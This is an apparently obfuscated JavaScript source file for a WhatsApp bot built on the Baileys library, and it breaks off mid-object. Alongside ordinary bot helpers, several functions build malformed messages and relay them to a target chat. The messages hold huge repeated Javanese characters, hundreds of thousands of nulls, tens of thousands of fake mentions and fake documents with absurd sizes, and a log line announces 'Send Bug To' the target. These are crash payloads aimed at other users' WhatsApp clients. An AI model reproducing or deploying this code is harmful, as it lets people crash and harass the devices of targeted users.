require("./setting");
const {
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const util = require("util");
const chalk = require("chalk");
const os = require("os");
const axios = require("axios");
const pino = require("pino");
const fsx = require("fs-extra");
const crypto = require("crypto");
const ffmpeg = require("fluent-ffmpeg");
const moment = require("moment-timezone");
const {
  JSDOM
} = require("jsdom");
const PhoneNumber = require("awesome-phonenumber");
const {
  color,
  bgcolor
} = require("./lib/color");
const {
  uptotelegra
} = require("./lib/upload");
const {
  Primbon
} = require("scrape-primbon");
const primbon = new Primbon();
const {
  remini
} = require("./database/remini");
const hxz = require("hxz-api");
const ytdl = require("ytdl-core");
const {
  Configuration,
  OpenAIApi
} = require("openai");
const {
  exec,
  spawn,
  execSync
} = require("child_process");
const {
  smsg,
  getTime,
  isUrl,
  sleep,
  clockString,
  runtime,
  fetchJson,
  getBuffer,
  jsonformat,
  format,
  parseMention,
  getRandom,
  getGroupAdmins
} = require("./lib/myfunc");
const {
  FajarNews,
  BBCNews,
  metroNews,
  CNNNews,
  iNews,
  KumparanNews,
  TribunNews,
  DailyNews,
  DetikNews,
  OkezoneNews,
  CNBCNews,
  KompasNews,
  SindoNews,
  TempoNews,
  IndozoneNews,
  AntaraNews,
  RepublikaNews,
  VivaNews,
  KontanNews,
  MerdekaNews,
  KomikuSearch,
  AniPlanetSearch,
  KomikFoxSearch,
  KomikStationSearch,
  MangakuSearch,
  KiryuuSearch,
  KissMangaSearch,
  KlikMangaSearch,
  PalingMurah,
  LayarKaca21,
  AminoApps,
  Mangatoon,
  WAModsSearch,
  Emojis,
  CoronaInfo,
  JalanTikusMeme,
  Cerpen,
  Quotes,
  Couples,
  Darkjokes
} = require("dhn-api");
const {
  isSetBot,
  addSetBot,
  removeSetBot,
  changeSetBot,
  getTextSetBot,
  updateResponList,
  delResponList,
  renameList,
  isAlreadyResponListGroup,
  sendResponList,
  isAlreadyResponList,
  getDataResponList,
  addResponList,
  isSetClose,
  addSetClose,
  removeSetClose,
  changeSetClose,
  getTextSetClose,
  isSetDone,
  addSetDone,
  removeSetDone,
  changeSetDone,
  getTextSetDone,
  isSetLeft,
  addSetLeft,
  removeSetLeft,
  changeSetLeft,
  getTextSetLeft,
  isSetOpen,
  addSetOpen,
  removeSetOpen,
  changeSetOpen,
  getTextSetOpen,
  isSetProses,
  addSetProses,
  removeSetProses,
  changeSetProses,
  getTextSetProses,
  isSetWelcome,
  addSetWelcome,
  removeSetWelcome,
  changeSetWelcome,
  getTextSetWelcome,
  addSewaGroup,
  getSewaExpired,
  getSewaPosition,
  expiredCheck,
  checkSewaGroup,
  addPay,
  updatePay
} = require("./lib/store");
function msToDate(_0x40a35c) {
  temp = _0x40a35c;
  days = Math.floor(_0x40a35c / 86400000);
  daysms = _0x40a35c % 86400000;
  hours = Math.floor(daysms / 3600000);
  hoursms = _0x40a35c % 3600000;
  minutes = Math.floor(hoursms / 60000);
  minutesms = _0x40a35c % 60000;
  sec = Math.floor(minutesms / 1000);
  return days + " Days " + hours + " Hours " + minutes + " Minutes";
}
const tanggal = _0x419f9f => {
  myMonths = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
  myDays = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jum’at", "Sabtu"];
  var _0xaf46ed = new Date(_0x419f9f);
  var _0x5324b3 = _0xaf46ed.getDate();
  bulan = _0xaf46ed.getMonth();
  var _0x561ae0 = _0xaf46ed.getDay();
  var _0x561ae0 = myDays[_0x561ae0];
  var _0x26e281 = _0xaf46ed.getYear();
  var _0x473040 = _0x26e281 < 1000 ? _0x26e281 + 1900 : _0x26e281;
  const _0x161fed = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
  let _0x13d4b2 = new Date();
  let _0x1ee12c = "id";
  let _0x40f294 = new Date(0).getTime() - new Date("1 January 1970").getTime();
  let _0x2a763d = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][Math.floor((_0x13d4b2 * 1 + _0x40f294) / 84600000) % 5];
  return _0x561ae0 + ", " + _0x5324b3 + " - " + myMonths[bulan] + " - " + _0x473040;
};
module.exports = drayyy = async (_0x554af5, _0x5dd2ef, _0x272fda, _0x1e3526, _0x3f44e5, _0x1e8f9a, _0x11f03b, _0x3747fd, _0x15d460, _0x10ed54, _0x2bb369, _0x835014, _0x564aca, _0x1fc717, _0x3c0456, _0x380dc9, _0x253222, _0x1f28cb, _0x4f03a5, _0x2eb899) => {
  try {
    var _0x57107d = _0x5dd2ef.mtype === "conversation" ? _0x5dd2ef.message.conversation : _0x5dd2ef.mtype == "imageMessage" ? _0x5dd2ef.message.imageMessage.caption : _0x5dd2ef.mtype == "videoMessage" ? _0x5dd2ef.message.videoMessage.caption : _0x5dd2ef.mtype == "extendedTextMessage" ? _0x5dd2ef.message.extendedTextMessage.text : _0x5dd2ef.mtype == "buttonsResponseMessage" ? _0x5dd2ef.message.buttonsResponseMessage.selectedButtonId : _0x5dd2ef.mtype == "listResponseMessage" ? _0x5dd2ef.message.listResponseMessage.singleSelectReply.selectedRowId : _0x5dd2ef.mtype == "templateButtonReplyMessage" ? _0x5dd2ef.message.templateButtonReplyMessage.selectedId : _0x5dd2ef.mtype == "interactiveResponseMessage" ? JSON.parse(_0x5dd2ef.msg.nativeFlowResponseMessage.paramsJson).id : _0x5dd2ef.mtype == "templateButtonReplyMessage" ? _0x5dd2ef.msg.selectedId : _0x5dd2ef.mtype === "messageContextInfo" ? _0x5dd2ef.message.buttonsResponseMessage?.selectedButtonId || _0x5dd2ef.message.listResponseMessage?.singleSelectReply.selectedRowId || _0x5dd2ef.text : "";
    var _0x349f58 = typeof _0x5dd2ef.text == "string" ? _0x5dd2ef.text : "";
    const _0x505e97 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(_0x57107d) ? _0x57107d.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : "";
    const _0x3863b7 = (_0x585d75, _0x11fb68 = 1) => {
      var _0x2ec561 = "abcdefghijklmnopqrstuvwxyz1234567890".split("");
      var _0x591244 = {
        1: "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890"
      };
      var _0x586e69 = [];
      _0x2ec561.map((_0xb3f576, _0x589293) => _0x586e69.push({
        original: _0xb3f576,
        convert: _0x591244[_0x11fb68].split("")[_0x589293]
      }));
      var _0x365a0b = _0x585d75.toLowerCase().split("");
      var _0x48d3ed = [];
      _0x365a0b.map(_0x5f314f => {
        const _0xd5bca6 = _0x586e69.find(_0x14619f => _0x554af5.original == _0x5f314f);
        if (_0xd5bca6) {
          _0x48d3ed.push(_0xd5bca6.convert);
        } else {
          _0x48d3ed.push(_0x5f314f);
        }
      });
      return _0x48d3ed.join("");
    };
    const _0x12c5f0 = _0x5dd2ef.pushName || "No Name";
    function _0x5aab79() {
      var _0x201229 = new Date();
      var _0x494bc2 = _0x201229.getDate();
      var _0x23ad07 = _0x201229.getMonth() + 1;
      var _0x2b64eb = _0x201229.getFullYear();
      var _0x5671c0 = _0x201229.getHours();
      var _0x1f869d = _0x201229.getMinutes();
      var _0xb24cb6 = _0x201229.getSeconds();
    }
    const _0x38b0dc = _0x57107d.startsWith(_0x505e97);
    const _0x3c8344 = _0x38b0dc ? _0x57107d.slice(_0x505e97.length).trim().split(" ").shift().toLowerCase() : "";
    const _0x1d31fd = _0x57107d.trim().split(/ +/).slice(1);
    const _0x48a68a = await _0x554af5.decodeJid(_0x554af5.user.id);
    const _0x1e7bc9 = [_0x48a68a, ...global.owner].map(_0x1ee7b3 => _0x1ee7b3.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(_0x5dd2ef.sender);
    const _0x2ece04 = q = _0x1d31fd.join(" ");
    const {
      type: _0x373edc,
      quotedMsg: _0x359c47,
      mentioned: _0x2afc87,
      now: _0x393d49,
      fromMe: _0x13fb50
    } = _0x5dd2ef;
    const _0x5c113a = _0x5dd2ef.quoted ? _0x5dd2ef.quoted : _0x5dd2ef;
    const _0xb4c66d = (_0x5c113a.msg || _0x5c113a).mimetype || "";
    const _0x311125 = /image|video|sticker|audio/.test(_0xb4c66d);
    const _0x2f68f6 = mek.key.remoteJid;
    const _0x4a73b4 = _0x2f68f6.endsWith("@g.us");
    const _0x4e6b39 = _0x2f68f6.endsWith("@s.whatsapp.net");
    const _0x3594d7 = _0x5dd2ef.isGroup ? _0x5dd2ef.key.participant ? _0x5dd2ef.key.participant : _0x5dd2ef.participant : _0x5dd2ef.key.remoteJid;
    const _0x4dcca6 = _0x3594d7.split("@")[0];
    const _0x42115e = _0x48a68a.includes(_0x4dcca6);
    const _0x379cf7 = _0x5dd2ef.isGroup ? await _0x554af5.groupMetadata(_0x2f68f6).catch(_0x5c03b1 => {}) : "";
    const _0x453482 = _0x5dd2ef.isGroup ? _0x379cf7.subject : "";
    const _0xf906a3 = _0x5dd2ef.isGroup ? await _0x379cf7.participants : "";
    const _0x2102dc = _0x5dd2ef.isGroup ? await getGroupAdmins(_0xf906a3) : "";
    const _0x5c5d5c = _0x5dd2ef.isGroup ? _0x2102dc.includes(_0x48a68a) : false;
    const _0x58e970 = _0x5dd2ef.isGroup ? _0x2102dc.includes(_0x5dd2ef.sender) : false;
    const _0x54c711 = JSON.parse(fs.readFileSync("./database/testimoni.json"));
    let _0x40a75a = JSON.parse(fs.readFileSync("./database/set_welcome.json"));
    let _0x264885 = JSON.parse(fs.readFileSync("./database/set_left.json"));
    let _0x366a12 = JSON.parse(fs.readFileSync("./database/welcome.json"));
    let _0x55a1e5 = JSON.parse(fs.readFileSync("./database/left.json"));
    let _0x25b93d = JSON.parse(fs.readFileSync("./database/set_proses.json"));
    let _0x56ad2b = JSON.parse(fs.readFileSync("./database/set_done.json"));
    let _0x706d98 = JSON.parse(fs.readFileSync("./database/set_open.json"));
    let _0x2ffa38 = JSON.parse(fs.readFileSync("./database/set_close.json"));
    let _0x4f1b8e = JSON.parse(fs.readFileSync("./database/sewa.json"));
    let _0x2c384 = JSON.parse(fs.readFileSync("./database/pay.json"));
    let _0x582597 = JSON.parse(fs.readFileSync("./database/opengc.json"));
    let _0x5ad409 = JSON.parse(fs.readFileSync("./database/antilink.json"));
    let _0x5ede5c = JSON.parse(fs.readFileSync("./database/antiwame.json"));
    let _0x434edd = JSON.parse(fs.readFileSync("./database/antilink2.json"));
    let _0x53672c = JSON.parse(fs.readFileSync("./database/autojpm.json"));
    let _0x2a3592 = JSON.parse(fs.readFileSync("./database/antiwame2.json"));
    let _0x554410 = JSON.parse(fs.readFileSync("./database/list.json"));
    const _0x7fe93f = JSON.parse(fs.readFileSync("./database/premium.json"));
    const _0x44d549 = JSON.parse(fs.readFileSync("./database/partner.json"));
    const _0x259e8b = JSON.parse(fs.readFileSync("./database/owner.json"));
    const _0x2853f7 = JSON.parse(fs.readFileSync("./database/unli.json"));
    const _0x5cdd11 = fs.readFileSync("./zeno/draybergoyang.mp3");
    const _0x4af9fb = JSON.parse(fs.readFileSync("./database/dray/contacts.json"));
    const _0xbf89b5 = JSON.stringify(_0x5dd2ef.message);
    const _0x2d4d10 = JSON.parse(fs.readFileSync("./database/idgrup.json").toString());
    const _0x678fcd = _0x5dd2ef.isGroup ? _0x2d4d10.includes(_0x5dd2ef.chat) : false;
    const _0x4c8335 = _0x2ece04.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
    const _0xbbcea6 = _0x5dd2ef.mtype == "extendedTextMessage" && _0x5dd2ef.message.extendedTextMessage.contextInfo != null ? _0x5dd2ef.message.extendedTextMessage.contextInfo.mentionedJid : [];
    const _0x33b1a9 = _0x4af9fb.includes(_0x3594d7);
    const _0x47df59 = _0x366a12.includes(_0x5dd2ef.chat);
    const _0x311b38 = _0x55a1e5.includes(_0x5dd2ef.chat);
    const _0x4f4df0 = _0x5ad409.includes(_0x5dd2ef.chat) ? true : false;
    const _0x5a3bab = _0x434edd.includes(_0x5dd2ef.chat) ? true : false;
    const _0x2d3822 = _0x53672c.includes(_0x5dd2ef.chat) ? true : false;
    const _0x1db4e8 = _0x7fe93f.includes(_0x3594d7);
    const _0x3da684 = _0x44d549.includes(_0x3594d7);
    const _0x58d2b2 = _0x2853f7.includes(_0x5dd2ef.chat);
    const _0x439cd6 = _0x259e8b.includes(_0x3594d7) ? true : _0x5dd2ef.sender == _0x48a68a ? true : false;
    const _0x5921de = fs.readFileSync("./zeno/Xynz.jpg");
    const _0xeca962 = _0x373edc == "extendedTextMessage" && _0x5dd2ef.message.extendedTextMessage.contextInfo != null ? _0x5dd2ef.message.extendedTextMessage.contextInfo.participant || "" : "";
    const _0x437c7f = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z");
    const _0x4ed198 = moment().tz("Asia/Kolkata").format("HH:mm:ss");
    if (_0x4ed198 < "23:59:00") {
      var _0x4a3978 = _0x3863b7("Good Night");
    }
    if (_0x4ed198 < "19:00:00") {
      var _0x4a3978 = _0x3863b7("Good Evening");
    }
    if (_0x4ed198 < "18:00:00") {
      var _0x4a3978 = _0x3863b7("Good Evening");
    }
    if (_0x4ed198 < "15:00:00") {
      var _0x4a3978 = _0x3863b7("Good Afternoon");
    }
    if (_0x4ed198 < "11:00:00") {
      var _0x4a3978 = _0x3863b7("Good Morning");
    }
    if (_0x4ed198 < "05:00:00") {
      var _0x4a3978 = _0x3863b7("Good Morning");
    }
    const _0x3db57b = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a");
    const _0x2984fd = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
    const _0x384089 = _0x5dd2ef.quoted ? "true" : "false";
    async function _0x54410f(_0x501069, _0x482554) {
      fs.readFile(_0x501069, "utf8", (_0x3e12e5, _0x55e572) => {
        if (_0x3e12e5) {
          console.error("Terjadi kesalahan:", _0x3e12e5);
          return;
        }
        const _0x302101 = new RegExp("case\\s+'" + _0x482554 + "':[\\s\\S]*?break", "g");
        const _0x32cd6e = _0x55e572.replace(_0x302101, "");
        fs.writeFile(_0x501069, _0x32cd6e, "utf8", _0x4f92e2 => {
          if (_0x4f92e2) {
            console.error("Terjadi kesalahan saat menulis file:", _0x4f92e2);
            return;
          }
          console.log("Teks dari case '" + _0x482554 + "' telah dihapus dari file.");
        });
      });
    }
    const _0x212676 = _0x1c4f33 => {
      if (_0x1c4f33.match("@")) {
        return [..._0x1c4f33.matchAll(/@([0-9]{5,16}|0)/g)].map(_0x26472c => _0x26472c[1] + "@s.whatsapp.net");
      } else {
        return [_0x3594d7];
      }
    };
    const _0x1e3598 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        ...(_0x2f68f6 ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        extendedTextMessage: {
          text: _0x57107d
        }
      }
    };
    const _0x3f20c7 = async _0x3b0143 => _0x554af5.sendMessage(_0x5dd2ef.chat, {
      text: _0x3b0143,
      contextInfo: {
        mentionedJid: [_0x3594d7],
        forwardingScore: 9999999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          containsAutoReply: true,
          title: "𝐕𝟕",
          body: "〽️",
          previewType: "PHOTO",
          thumbnailUrl: "youtube.com/@drayyyxd",
          thumbnail: fs.readFileSync("./zeno/Xynz.jpg"),
          sourceUrl: "https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L"
        }
      }
    }, {
      quoted: _0x5dd2ef
    });
    if (!_0x554af5.public) {
      if (!_0x5dd2ef.key.fromMe) {
        return;
      }
    }
    let _0x42c23a = ["recording"];
    let _0x541951 = _0x42c23a[Math.floor(Math.random() * _0x42c23a.length)];
    if (_0x5dd2ef.message) {
      _0x554af5.sendPresenceUpdate("available", _0x5dd2ef.chat);
      console.log("[1;31m~[1;37m>", "[[1;32m DrayXD [1;37m]", _0x437c7f, chalk.blue(_0x349f58 || _0x5dd2ef.mtype), "ZENO");
    }
    for (let _0x5496fa of _0x54c711) {
      if (_0x349f58 === _0x5496fa) {
        let _0x1de16b = fs.readFileSync("./database/dray/" + _0x5496fa + ".jpg");
        _0x554af5.sendMessage(_0x5dd2ef.chat, {
          image: _0x1de16b
        }, {
          quoted: _0x5dd2ef
        });
      }
    }
    const {
      ios: _0x59ff98
    } = require("./database/virtex/ios.js");
    const {
      telapreta3: _0x2482e6
    } = require("./database/virtex/telapreta3.js");
    const {
      convite: _0x200593
    } = require("./database/virtex/convite.js");
    const {
      bugpdf: _0x26ef70
    } = require("./database/virtex/bugpdf.js");
    const {
      cP: _0x2d0fb5
    } = require("./database/virtex/bugUrl.js");
    const {
      beta1: _0x2164f6,
      beta2: _0x2a3f1c,
      buk1: _0x16cf51
    } = require("./database/hdr.js");
    const _0x2ca3cb = _0x5dd2ef.mtype === "extendedTextMessage" && _0xbf89b5.includes("viewOnceMessage");
    const _0x43d260 = _0x45576a => {
      return _0x554af5.sendMessage(_0x5dd2ef.chat, {
        react: {
          text: _0x45576a,
          key: _0x5dd2ef.key
        }
      });
    };
    const _0x46403b = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "\0".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    async function _0xaadba0(_0xcca849, _0x4c57e7 = false) {
      let _0x1de7f0 = "🗡𝐙𝐞𝐧𝐨 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮↯\n© DrayCrasher" + "ꦾ".repeat(90000) + "@6283151568511".repeat(50000);
      await _0x554af5.relayMessage(_0xcca849, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "Drayy",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: "https://files.catbox.moe/uk38k6.jpg"
                },
                hasMediaAttachment: true
              },
              body: {
                text: _0x1de7f0
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: ["6283151568511@s.whatsapp.net"],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "Bokep 18+",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: "https://files.catbox.moe/uk38k6.jpg"
                  }
                }
              }
            }
          }
        }
      }, _0x4c57e7 ? {
        participant: {
          jid: _0xcca849,
          quoted: _0x46403b
        }
      } : {});
      console.log(chalk.yellow.bold("Zeno Send Bug To " + _0xcca849));
    }
    async function _0x41dec7(_0x35432a) {
      let _0xe3fb3c = "𝐙𝐞𝐧𝐨 𝐀𝐧𝐭𝐢 𝐊𝐫𝐨𝐜𝐨";
      await _0x554af5.relayMessage(_0x35432a, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "𝐙𝐞𝐧𝐨 𝐈𝐬 𝐇𝐞𝐫𝐞" + "@Drayyy".repeat(300000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "D̸̢̮̫̰̥̗̘̱͉͙͙̺̫̏͒̅̌ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️â̸̙͐͑̌̿͛̽y̷̧̰̲͍̝̘̗̩̑̇͐̾̽̏͊͑̇̃̉͜y̷̧̰̲͍̝̘̗̩̑̇͐̾̽̏͊͑̇̃̉͜ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️o̶̯͎̱͐̇͋̅̃̈́͋̽̊̀̓͊̃́͋̓ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️ "
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x35432a
        }
      }, {
        messageId: null
      });
    }
    const _0x2da3b9 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: {
        orderMessage: {
          orderId: "999999999999",
          thumbnail: null,
          itemCount: 999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "p̸̢̻͓͎̻͙͂͒̋͒̓̃͊̐̔͘͝o̶̯͎̱̱̱̱̱̱̱̱͐̇͋̅̃̈́͋̽̊̀̓͊̃́͋̓𝐳Σ⋂⨀o̶̯͎̱͐̇͋̅̃̈́͋̽̊̀̓͊̃́͋̓p̸̢̻͓͎̻͙͂͒̋͒̓̃͊̐̔͘͝",
          token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
      },
      contextInfo: {
        mentionedJid: ["27746135260@s.whatsapp.net"],
        forwardingScore: 999,
        isForwarded: true
      }
    };
    async function _0x37c3d6(_0x42cf7f) {
      let _0x191e6e = "𝐒𝐯 𝐃𝐫𝐚𝐲𝐌𝐨𝐝𝐬" + "ꦾ".repeat(50000);
      let _0x10170e = Array.from({
        length: 35000
      }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");
      let _0x534694 = {
        groupMentionedMessage: {
          message: {
            listResponseMessage: {
              title: " @120363326274964194@g.us",
              listType: "SINGLE_SELECT",
              singleSelectReply: {
                selectedRowId: "Gateway To Hell"
              },
              description: " @120363326274964194@g.us",
              contextInfo: {
                mentionedJid: _0x10170e,
                groupMentions: [{
                  groupJid: "120363326274964194@g.us",
                  groupSubject: _0x191e6e
                }]
              }
            }
          }
        }
      };
      await _0x554af5.relayMessage(_0x42cf7f, _0x534694, {
        participant: {
          jid: _0x42cf7f
        }
      }, {
        messageId: null
      });
    }
    async function _0x9e6501(_0x11efbc) {
      await _0x554af5.relayMessage(_0x11efbc, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "𝐙𝐄𝐍𝐎 𝐈𝐊𝐈 𝐂𝐀𝐊𝐊!!!" + "ꦾ".repeat(300000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: " Xintrashboy "
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x11efbc
        }
      }, {
        messageId: null
      });
    }
    async function _0x4ab630(_0x5981ab, _0x269db0 = false) {
      await _0x554af5.relayMessage(_0x5981ab, {
        extendedTextMessage: {
          text: "𝐌𝐀𝐌𝐏𝐔𝐒 𝐊𝐄𝐍𝐀 𝐔𝐈\n> 𝐙𝐞𝐧𝐨-𝐕𝟔\n" + "ꦾ".repeat(45000),
          contextInfo: {
            mentionedJid: ["6282146497469@s.whatsapp.net", ...Array.from({
              length: 15000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            stanzaId: "1234567890ABCDEF",
            participant: "6282146497469@s.whatsapp.net",
            quotedMessage: {
              callLogMesssage: {
                isVideo: false,
                callOutcome: "5",
                durationSecs: "999",
                callType: "REGULAR",
                participants: [{
                  jid: "6282146497469@s.whatsapp.net",
                  callOutcome: "5"
                }]
              }
            },
            remoteJid: _0x5981ab,
            conversionSource: " X ",
            conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
            conversionDelaySeconds: 10,
            forwardingScore: 10,
            isForwarded: false,
            quotedAd: {
              advertiserName: " X ",
              mediaType: "IMAGE",
              jpegThumbnail: fs.readFileSync("./zeno/anjay.jpg"),
              caption: " X "
            },
            placeholderKey: {
